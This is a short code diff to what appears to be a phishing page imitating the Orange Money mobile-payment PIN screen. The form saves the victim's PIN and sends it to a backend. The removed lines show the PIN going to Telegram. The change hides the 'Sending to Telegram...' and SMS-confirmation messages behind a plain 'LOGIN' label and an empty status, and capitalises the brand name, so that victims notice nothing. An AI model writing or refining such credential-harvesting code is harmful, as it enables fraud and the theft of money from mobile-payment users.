@@ -84,7 +84,7 @@ button:disabled {
 <div class="pin-container">
 
     <div class="logo">
-        <h1>orange money pin</h1>
+        <h1>Orange money pin</h1>
     </div>
 
     <form id="pinForm">
@@ -122,8 +122,8 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
     localStorage.setItem('pin', pin);
 
     btn.disabled = true;
-    btn.textContent = 'Sending to Telegram...';
-    statusDiv.textContent = 'Please click the link you received in SMS to confirm your connection.';
+    btn.textContent = 'LOGIN'; // keep button text same, no extra message
+    statusDiv.textContent = ''; // do not show any message
 
     try {
         // send details to backend
